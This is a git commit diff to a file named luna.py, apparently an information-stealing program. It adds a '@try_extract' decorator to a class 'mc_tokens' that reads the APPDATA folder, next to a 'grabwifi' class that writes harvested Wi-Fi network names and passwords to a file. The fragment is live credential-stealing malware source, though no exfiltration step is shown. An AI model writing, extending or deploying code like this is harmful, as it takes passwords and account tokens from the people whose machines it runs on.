63f22e43296f10e7adc31e37e0827f312ddc347d
Smug <99215486+Smug246@users.noreply.github.com>
2022-07-28 23:06:15 +0100

    Update luna.py

--- luna.py
+++ luna.py
@@ -519,7 +519,7 @@ class grabwifi:
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
 
-
+@try_extract
 class mc_tokens():
     def __init__(self):
         self.roaming = os.getenv("appdata")
